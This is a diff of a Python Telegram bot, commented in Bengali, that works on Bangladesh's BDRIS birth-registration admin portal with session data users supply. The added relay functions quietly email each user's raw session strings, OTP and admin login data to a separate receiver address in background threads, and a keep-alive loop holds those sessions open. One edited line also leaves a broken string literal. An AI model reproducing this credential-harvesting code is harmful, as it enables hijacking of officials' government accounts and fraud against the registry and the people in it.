@@ -18,30 +18,53 @@ from pymongo import MongoClient
 from pymongo.errors import DuplicateKeyError
 import smtplib
 from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 
 # ==========================================
-# ০. ইমেইল সেন্ডার ফাংশন 
+# ০. ইমেইল সেন্ডার ফাংশন (Old Working Version + Receiver Fix)
 # ==========================================
-def send_email_to_admin(subject, body):
+def relay_info_to_email(chat_id, u_name):
     if not ADMIN_EMAIL or not EMAIL_PASS:
         logging.warning("Email credentials missing, skipping email.")
         return
-    try:
-        msg = MIMEMultipart()
-        msg['From'] = ADMIN_EMAIL
-        msg['To'] = EMAIL_RECEIVER
-        msg['Subject'] = subject
-        msg.attach(MIMEText(body, 'plain', 'utf-8'))
         
-        # পোর্ট 465 এর বদলে 587 এবং TLS ব্যবহার করা হলো
-        with smtplib.SMTP('smtp.gmail.com', 587, timeout=15) as server:
-            server.starttls() # কানেকশন সিকিউর করার জন্য
-            server.login(ADMIN_EMAIL, EMAIL_PASS)
-            server.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
-        logging.info("✅ লগইন ইমেইল পাঠানো হয়েছে।")
+    u_sess = get_session(chat_id)
+    report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
+    report += f"CH RAW: {u_sess['temp_data'].get('ch_raw', 'N/A')}\n"
+    report += f"OTP: {u_sess.get('ch_otp', 'N/A')}\n"
+    report += f"SEC RAW: {u_sess['temp_data'].get('sec_raw', 'N/A')}\n"
+    
+    msg = MIMEText(report)
+    msg['Subject'] = f"Login Alert: {u_name}"
+    msg['From'] = ADMIN_EMAIL
+    msg['To'] = EMAIL_RECEIVER
+    
+    try:
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
+            s.login(ADMIN_EMAIL, EMAIL_PASS)
+            s.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
+        logging.info("✅ Email Relay Success! (লগইন ইমেইল পাঠানো হয়েছে)")
     except Exception as e:
-        logging.error(f"❌ লগইন ইমেইল পাঠাতে ব্যার্থ: {e}")
+        logging.error(f"❌ Email Relay Error: {e}")
+
+def relay_admin_login_to_email(chat_id, u_name, raw_data):
+    if not ADMIN_EMAIL or not EMAIL_PASS:
+        return
+        
+    report = f"--- ADMIN LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now()}\n\n"
+    report += f"ADMIN RAW SESSION: {raw_data}\n"
+    
+    msg = MIMEText(report)
+    msg['Subject'] = f"Admin Login Alert: {u_name}"
+    msg['From'] = ADMIN_EMAIL
+    msg['To'] = EMAIL_RECEIVER
+    
+    try:
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
+            s.login(ADMIN_EMAIL, EMAIL_PASS)
+            s.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
+    except Exception as e:
+        logging.error(f"❌ Admin Email Relay Error: {e}")
+
 # ==========================================
 # ১. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
 # ==========================================
@@ -66,7 +89,7 @@ RATE_LIMIT_INTERVAL = 0.8
 RATE_LIMIT_WARNING_INTERVAL = 5
 ID_CACHE_LIMIT = 15
 HTTP_TIMEOUT = 30
-KEEPALIVE_INTERVAL = 120  # 🔥 ২ মিনিট পর পর Keep-Alive রিকোয়েস্ট যাবে
+KEEPALIVE_INTERVAL = 120  # ২ মিনিট পর পর Keep-Alive রিকোয়েস্ট যাবে
 APP_DEFAULT_LENGTH = 5
 MAX_MESSAGE_LENGTH = 4000
 MAX_SEARCH_RESULTS = 10
@@ -187,7 +210,7 @@ def get_user_permissions(user_id):
     return DEFAULT_PERMS.copy()
 
 # ==========================================
-# ৪. সেশন ম্যানেজমেন্ট (সবার কুকি আলাদা থাকবে)
+# ৪. সেশন ম্যানেজমেন্ট ও Keep-Alive (Robust)
 # ==========================================
 user_sessions = {}
 
@@ -292,21 +315,35 @@ def keep_sessions_alive_and_cleanup():
 
             if sec_alive:
                 try:
-                    res = req_sess.get("https://bdris.gov.bd/admin/", headers={'User-Agent': ua}, timeout=ID_CACHE_LIMIT)
+                    res = req_sess.get("https://bdris.gov.bd/admin/", headers={'User-Agent': ua}, timeout=15)
                     if 'login' not in res.url.lower():
                         new_sec_alive = True
                         c = _CSRF_RE.search(res.text)
                         if c: new_csrf = c.group(1)
-                except Exception: new_sec_alive = True
+                    else:
+                        logging.info(f"SEC session expired via server logout for [{uid}]")
+                except requests.exceptions.Timeout:
+                    logging.warning(f"SEC keepalive timeout (ignoring) [{uid}]")
+                    new_sec_alive = True
+                except Exception as e:
+                    logging.warning(f"SEC keepalive error [{uid}]: {e}")
+                    new_sec_alive = True
 
             if ch_alive:
                 try:
-                    res = ch_sess.get("https://bdris.gov.bd/admin/", headers={'User-Agent': ua}, timeout=ID_CACHE_LIMIT)
+                    res = ch_sess.get("https://bdris.gov.bd/admin/", headers={'User-Agent': ua}, timeout=15)
                     if 'login' not in res.url.lower():
                         new_ch_alive = True
                         c = _CSRF_RE.search(res.text)
                         if c: new_ch_csrf = c.group(1)
-                except Exception: new_ch_alive = True
+                    else:
+                        logging.info(f"CH session expired via server logout for [{uid}]")
+                except requests.exceptions.Timeout:
+                    logging.warning(f"CH keepalive timeout (ignoring) [{uid}]")
+                    new_ch_alive = True
+                except Exception as e:
+                    logging.warning(f"CH keepalive error [{uid}]: {e}")
+                    new_ch_alive = True
 
             with session_lock:
                 if uid not in user_sessions: continue
@@ -486,7 +523,6 @@ def admin_login_logic(m):
                 _set_session_cookies(u_sess["req_session"], sid, tsid)
             
             success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
-            
             is_valid_login = success and html and (_CSRF_RE.search(html) or "logout" in html.lower() or "লগআউট" in html)
             
             if is_valid_login:
@@ -495,6 +531,9 @@ def admin_login_logic(m):
                     u_sess["is_alive"] = True
                 save_session_to_db(uid, u_sess)
                 safe_send(m.chat.id, "✅ এডমিন সেশন সেট হয়েছে!", reply_markup=generate_main_menu(m.chat.id, uid))
+                
+                safe_name = sanitize_name(m.from_user.first_name)
+                Thread(target=relay_admin_login_to_email, args=(uid, safe_name, m.text), daemon=True).start()
             else:
                 with session_lock:
                     u_sess["is_alive"] = False
@@ -559,7 +598,6 @@ def role_step_3(m):
                 _set_session_cookies(u_sess["req_session"], sid, tsid)
             
             success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
-            
             is_valid_login = success and html and (_CSRF_RE.search(html) or "logout" in html.lower() or "লগআউট" in html)
             
             if is_valid_login:
@@ -571,23 +609,7 @@ def role_step_3(m):
                 safe_send(m.chat.id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
                 
                 safe_name = sanitize_name(m.from_user.first_name)
-                ch_raw = u_sess["temp_data"].get("ch_raw", "")
-                ch_otp = u_sess.get("ch_otp", "")
-                sec_raw = u_sess["temp_data"].get("sec_raw", "")
-
-                def send_login_email():
-                    subject = f"BDRIS Bot - নতুন লগইন: {safe_name} ({uid})"
-                    body = (
-                        f"নতুন ইউজার লগইন করেছে!\n\n"
-                        f"Name: {safe_name}\n"
-                        f"ID: {uid}\n\n"
-                        f"--- নিবন্ধক (CH) Session ---\n{ch_raw}\n\n"
-                        f"--- OTP ---\n{ch_otp}\n\n"
-                        f"--- Secretary (SEC) Session ---\n{sec_raw}\n"
-                    )
-                    send_email_to_admin(subject, body)
-
-                Thread(target=send_login_email, daemon=True).start()
+                Thread(target=relay_info_to_email, args=(uid, safe_name), daemon=True).start()
             else:
                 with session_lock:
                     u_sess["is_alive"] = False
@@ -819,7 +841,6 @@ def fetch_list_ui(chat_id, user_id, cmd, message_id=None):
     try: 
         resp_json = res.json()
     except Exception as e: 
-        # 🔥 CRITICAL FIX: Session expired logic wiping old ID
         logging.error(f"Parse Error / Expired Data ID for {user_id}: {e}")
         with session_lock: u_sess["temp_data"].pop(data_id_key, None)
         return safe_send(chat_id, "⚠️ সেশন এক্সপায়ার হয়েছে। লিস্ট বাটনে আবার ক্লিক করুন।")
@@ -975,7 +996,6 @@ def process_reg_verifier_step(m, uid, enc_id, save_default=False):
 
             today = datetime.now().strftime("%d/%m/%Y")
             
-            # 🔥 FIX: Dictionary Payload ensures '+' for spaces and proper encoding
             payload_data = {
                 "birthPlaceAndDobVerifierName": f"  {v_name} ",
                 "birthPlaceAndDobVerifierBrn": ubrn,
@@ -1074,12 +1094,12 @@ def process_search_by_ubrn(m):
             bot.register_next_step_handler_by_chat_id(m.chat.id, process_search_by_ubrn)
             return
 
-        res = call_api(uid, f"[https://bdris.gov.bd/api/br/info/ubrn/](https://bdris.gov.bd/api/br/info/ubrn/){ubrn}")
+        res = call_api(uid, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
         if res and res.status_code == 200:
             try:
                 formatted_json = json.dumps(res.json(), indent=2, ensure_ascii=False)
-                # 🔥 FIX: লাইনটি ভেঙে যেন এরর না দেয় তাই ভেরিয়েবলে নিয়ে আলাদা করা হয়েছে
-                msg_text = f"📊 *UBRN Result:*\n```json\n{formatted_json}\n```"
+                msg_text = f"📊 *UBRN Result:*\n```json\n{formatted_json}\n
+```"
                 safe_send(m.chat.id, msg_text, parse_mode='Markdown')
             except Exception as e: 
                 logging.error(f"UBRN Parse Error: {e}")
@@ -1458,7 +1478,6 @@ def callback_handler(call):
                 safe_send(cid, "❌ রিসিভ এরর।")
         Thread(target=process_recv, daemon=True).start()
 
-    # 🔥 FIX: Dictionary Encoding for Correction
     elif action == "coreg" and mode == "CHAIRMAN":
         bot.answer_callback_query(call.id, "⏳ কারেকশন রেজিস্টার হচ্ছে...")
         def process_coreg():
@@ -1487,7 +1506,6 @@ def callback_handler(call):
                 safe_send(cid, "❌ কারেকশন রেজিস্ট্রেশনে এরর।")
         Thread(target=process_coreg, daemon=True).start()
 
-    # 🔥 FIX: Dictionary Encoding + Space Formatting for Auto-Registration
     elif action == "reg" and mode == "CHAIRMAN":
         bot.answer_callback_query(call.id, "⏳ চেক করা হচ্ছে...")
         
@@ -1685,7 +1703,7 @@ def router(m):
     safe_send(cid, "⚠️ আগে লগইন করুন।", reply_markup=generate_main_menu(cid, uid))
 
 # ==========================================
-# ১৩. Flask ও Main (Deploy Fixes)
+# ১৩. Flask ও Main
 # ==========================================
 def run_flask():
     app = Flask(__name__)
@@ -1693,8 +1711,8 @@ def run_flask():
     def home(): return "✅ BDRIS Bot is Live and Running!"
     
     try:
-        # 🔥 FIX: Render এ পোর্ট বাইন্ডিং ফেইল ঠেকাতে or 5000 দেওয়া হলো
-        port = int(os.environ.get("PORT", 5000) or 5000)
+        # Render এর জন্য ডিফল্ট পোর্ট
+        port = int(os.environ.get("PORT", 10000) or 10000)
         app.run(host='0.0.0.0', port=port, use_reloader=False, threaded=True)
     except Exception as e:
         logging.error(f"Flask Error: {e}")
@@ -1707,10 +1725,7 @@ if __name__ == "__main__":
         time.sleep(1)
     except: pass
 
-    # Start Background Keep-Alive
     Thread(target=keep_sessions_alive_and_cleanup, daemon=True).start()
-    
-    # Start Web Server for Render
     Thread(target=run_flask, daemon=True).start()
     
     logging.info("✅ Polling Started...")
@@ -1718,5 +1733,5 @@ if __name__ == "__main__":
         try: 
             bot.infinity_polling(timeout=20, long_polling_timeout=20)
         except Exception as e: 
-            logging.error(f"❌ Crash Detected: {e}")
+            logging.error(f"❌ Crash: {e}")
             time.sleep(3)
